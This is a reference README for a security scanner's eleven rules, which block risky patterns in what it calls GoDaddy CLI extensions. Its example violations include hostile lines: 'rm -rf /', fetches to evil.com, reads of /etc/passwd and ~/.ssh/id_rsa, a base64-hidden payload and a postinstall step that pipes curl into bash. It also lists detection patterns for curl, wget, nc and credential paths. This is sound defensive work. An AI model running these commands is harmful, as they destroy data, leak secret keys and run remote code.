# Security Rules Reference

This directory contains all security rules enforced by the GoDaddy CLI security scanner.

## Rule Index

| Rule ID | Severity | Description |
|---------|----------|-------------|
| [SEC001](#sec001-command-injection) | `block` | Command Injection |
| [SEC002](#sec002-dynamic-code-execution) | `block` | Dynamic Code Execution |
| [SEC003](#sec003-vm-module-usage) | `block` | VM Module Usage |
| [SEC004](#sec004-file-system-manipulation) | `block` | File System Manipulation |
| [SEC005](#sec005-process-manipulation) | `block` | Process Manipulation |
| [SEC006](#sec006-network-untrusted-domains) | `block` | Network Access (Untrusted Domains) |
| [SEC007](#sec007-encoded-payloads) | `block` | Encoded Payloads |
| [SEC008](#sec008-debugger-inspection) | `block` | Debugger & Inspection |
| [SEC009](#sec009-module-loading) | `block` | Dynamic Module Loading |
| [SEC010](#sec010-path-traversal) | `block` | Path Traversal |
| [SEC011](#sec011-suspicious-scripts) | `warn` | Suspicious Package Scripts |

## Rule Details

### SEC001: Command Injection

**File:** `sec001-command-injection.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents execution of arbitrary system commands that could compromise server security.

**Detects:**
- `child_process.exec()`
- `child_process.execSync()`
- `child_process.spawn()`
- `child_process.spawnSync()`
- `child_process.execFile()`
- `child_process.fork()`

**Example Violations:**
```typescript
import { exec } from 'child_process';
exec('rm -rf /');  // BLOCKED
```

**Remediation:**
Use platform-provided APIs or standard Node.js modules (fs, https, etc.) instead of shell commands.

---

### SEC002: Dynamic Code Execution

**File:** `sec002-eval-function.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents runtime code evaluation that could execute malicious payloads.

**Detects:**
- `eval()`
- `Function()` constructor
- `setTimeout(string)`
- `setInterval(string)`

**Example Violations:**
```typescript
eval(userInput);                    // BLOCKED
new Function('return ' + code)();   // BLOCKED
setTimeout('malicious()', 1000);    // BLOCKED
```

**Remediation:**
Use JSON.parse() for data, switch statements for logic, or function references for callbacks.

---

### SEC003: VM Module Usage

**File:** `sec003-vm-module.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents use of Node.js VM module that can bypass sandbox restrictions.

**Detects:**
- `vm.runInNewContext()`
- `vm.runInThisContext()`
- `vm.createContext()`
- `vm.Script`

**Example Violations:**
```typescript
import vm from 'vm';
vm.runInNewContext(code);  // BLOCKED
```

**Remediation:**
Contact platform team if you need code execution in a sandboxed environment.

---

### SEC004: File System Manipulation

**File:** `sec004-fs-manipulation.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents dangerous file system operations that could corrupt data or delete critical files.

**Detects:**
- `fs.unlink()` / `fs.unlinkSync()`
- `fs.rmdir()` / `fs.rmdirSync()`
- `fs.rm()` / `fs.rmSync()`

**Example Violations:**
```typescript
import { unlink } from 'fs';
unlink('/etc/passwd');  // BLOCKED
```

**Remediation:**
Use read-only operations (readFile, readdir) or write to extension-specific directories only.

---

### SEC005: Process Manipulation

**File:** `sec005-process-manipulation.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents access to low-level process APIs that could compromise system security.

**Detects:**
- `process.binding()`
- `process.dlopen()`

**Example Violations:**
```typescript
process.binding('natives');  // BLOCKED
```

**Remediation:**
Use standard Node.js APIs. Low-level process access is not needed for extensions.

---

### SEC006: Network (Untrusted Domains)

**File:** `sec006-network-untrusted.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents network requests to untrusted domains to protect against data exfiltration.

**Trusted Domains:**
- `*.godaddy.com`
- `localhost`
- `127.0.0.1`

**Detects:**
- `fetch()` to untrusted URLs
- `https.request()` to untrusted hosts
- `http.request()` to untrusted hosts
- URL strings to untrusted domains

**Example Violations:**
```typescript
fetch('https://malicious.com/api');     // BLOCKED
https.request({ host: 'evil.com' });    // BLOCKED
const url = 'http://untrusted.net';     // BLOCKED
```

**Remediation:**
Use GoDaddy APIs or request domain whitelisting from the platform team.

---

### SEC007: Encoded Payloads

**File:** `sec007-encoded-payloads.ts`  
**Severity:** `block`  
**Default:** Enabled

Detects Base64/hex encoded strings that could hide malicious code.

**Detects:**
- `Buffer.from(str, 'base64')`
- `Buffer.from(str, 'hex')`
- `atob()`

**Example Violations:**
```typescript
const payload = Buffer.from('ZXZhbCgicm0gLXJmIC8iKQ==', 'base64');  // BLOCKED
```

**Remediation:**
Use utf-8 encoding for legitimate data. For binary assets, use standard file formats.

---

### SEC008: Debugger & Inspection

**File:** `sec008-debugger-inspection.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents debugging/inspection APIs that could be used to bypass security.

**Detects:**
- `debugger` statement
- `inspector.open()`
- `inspector.url()`

**Example Violations:**
```typescript
debugger;           // BLOCKED
inspector.open();   // BLOCKED
```

**Remediation:**
Use console.log() for debugging. Remove debugger statements before deployment.

---

### SEC009: Module Loading

**File:** `sec009-module-loading.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents dynamic module loading that could load malicious code.

**Detects:**
- `require()` with non-string-literal arguments
- `import()` with non-string-literal arguments
- Template literals in module paths

**Example Violations:**
```typescript
require(userInput);           // BLOCKED
import(dynamicPath);          // BLOCKED
require(`./plugins/${name}`); // BLOCKED
```

**Remediation:**
Use static imports with hardcoded paths only.

---

### SEC010: Path Traversal

**File:** `sec010-path-traversal.ts`  
**Severity:** `block`  
**Default:** Enabled

Prevents file access to sensitive system files.

**Sensitive Paths:**
- `/etc/*` (system configuration)
- `~/.ssh/*` (SSH keys)
- `/var/run/secrets/*` (Kubernetes secrets)
- `/root/*` (root user files)
- `C:\Windows\System32\config\*` (Windows registry)

**Detects:**
- String literals matching sensitive paths
- File operations on sensitive paths

**Example Violations:**
```typescript
readFile('/etc/passwd');            // BLOCKED
readFile('~/.ssh/id_rsa');          // BLOCKED
readFile('/var/run/secrets/token'); // BLOCKED
```

**Remediation:**
Use relative paths within your extension directory or environment variables for data paths.

---

### SEC011: Suspicious Package Scripts

**File:** `scripts-scanner.ts`  
**Severity:** `warn`  
**Default:** Enabled

Detects suspicious commands in package.json lifecycle scripts.

**Scanned Scripts:**
- `install`
- `preinstall`
- `postinstall`

**Suspicious Patterns:**
- `curl` / `wget` (download tools)
- `bash -c` / `sh -c` (arbitrary execution)
- `eval` / `exec` (shell evaluation)
- `nc` / `mkfifo` (network/IPC)
- `powershell -enc` (encoded commands)

**Example Violations:**
```json
{
  "scripts": {
    "postinstall": "curl http://remote.com/script.sh | bash"  // WARNING
  }
}
```

**Remediation:**
Remove suspicious commands or use legitimate build tools (tsc, webpack, etc.).

---

## Rule Implementation

All rules follow this structure:

```typescript
import type { Rule } from '../types';

export const sec001CommandInjection: Rule = {
  meta: {
    id: 'SEC001',
    defaultSeverity: 'block',
    title: 'Command Injection',
    description: 'Detects dangerous command execution...',
    remediation: 'Use platform APIs instead of shell commands',
    docsUrl: 'https://docs.godaddy.com/security/sec001',
  },
  create(ctx) {
    return {
      [SyntaxKind.CallExpression](node: ts.CallExpression) {
        // Rule implementation
        if (isCallToModule(node, 'child_process', ctx.aliasMaps)) {
          ctx.report({
            node,
            message: 'Command execution is not allowed',
          });
        }
      },
    };
  },
};
```

## Testing Rules

Each rule has corresponding tests in `tests/unit/security/rules/`:

```typescript
// tests/unit/security/rules/sec001-command-injection.test.ts
test('detects child_process.exec', () => {
  const code = `
    import { exec } from 'child_process';
    exec('rm -rf /');
  `;
  const findings = scanCode(code);
  expect(findings).toHaveLength(1);
  expect(findings[0].ruleId).toBe('SEC001');
});
```

## Adding New Rules

To add a new security rule:

1. **Create rule file**: `src/core/security/rules/sec0XX-rulename.ts`
2. **Define rule**: Follow the `Rule` interface
3. **Export rule**: Add to `src/core/security/rules/index.ts`
4. **Add tests**: Create `tests/unit/security/rules/sec0XX-rulename.test.ts`
5. **Update docs**: Add to this README and user guide

### Rule Naming Convention

- **ID**: `SEC0XX` (sequential numbers)
- **File**: `sec0XX-kebab-case-name.ts`
- **Constant**: `sec0XXCamelCaseName`

### Severity Guidelines

- **`block`**: Prevents obvious security vulnerabilities or malicious behavior
- **`warn`**: Detects suspicious patterns that may be legitimate in some cases

## Configuration

**Security rules are NOT configurable.** All rules run at their default severity level to ensure consistent security across all extensions. This is by design and cannot be changed by extension developers.

## Performance

Rules should be efficient and avoid expensive operations:
- ✅ Use AST pattern matching (fast)
- ✅ Cache expensive computations
- ❌ Avoid regex on entire file content
- ❌ Avoid recursive tree walks (use visitor pattern)

Target: <1ms per rule per file

## Resources

- **User Guide**: `/docs/security-scanning.md`
- **Type Definitions**: `/src/core/security/types.ts`
- **Test Examples**: `/tests/unit/security/rules/`
- **Scanner Engine**: `/src/core/security/engine.ts`

---

**Last Updated**: 2025-01-27  
**Rule Count**: 11 (SEC001-SEC011)
